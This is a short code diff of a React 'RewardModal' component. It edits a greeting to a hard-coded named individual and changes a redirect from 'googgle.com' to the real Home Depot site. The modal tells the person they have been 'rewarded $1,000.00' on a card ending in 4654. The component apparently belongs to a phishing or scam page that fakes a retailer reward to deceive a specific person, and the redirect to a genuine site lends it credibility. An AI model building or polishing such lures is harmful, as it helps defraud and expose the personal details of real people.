@@ -111,7 +111,7 @@ export default function RewardModal() {
       setIsVisible(false)
       setTimeout(() => {
         setIsOpen(false)
-        window.location.href = "https://www.googgle.com"
+        window.location.href = "https://www.homedepot.com"
         // Reset logic here if needed
       }, 300)
     } else {
@@ -227,7 +227,7 @@ export default function RewardModal() {
                 <div className="inline-flex items-center justify-center w-12 h-12 rounded-full bg-white/20 backdrop-blur-sm mb-4 ring-1 ring-white/30">
                   <CreditCard className="h-6 w-6 text-white" />
                 </div>
-                <h2 className="text-2xl font-bold tracking-tight">Hello, Annette T Perry</h2>
+                <h2 className="text-2xl font-bold tracking-tight">Hello Annette T Perry</h2>
                 <p className="text-orange-100 mt-2 text-sm leading-relaxed max-w-[280px] mx-auto">
                   You have been rewarded <span className="font-bold text-white">$1,000.00</span> on card ending in <span className="font-mono bg-white/20 px-1.5 py-0.5 rounded text-white">•••• 4654</span>
                 </p>
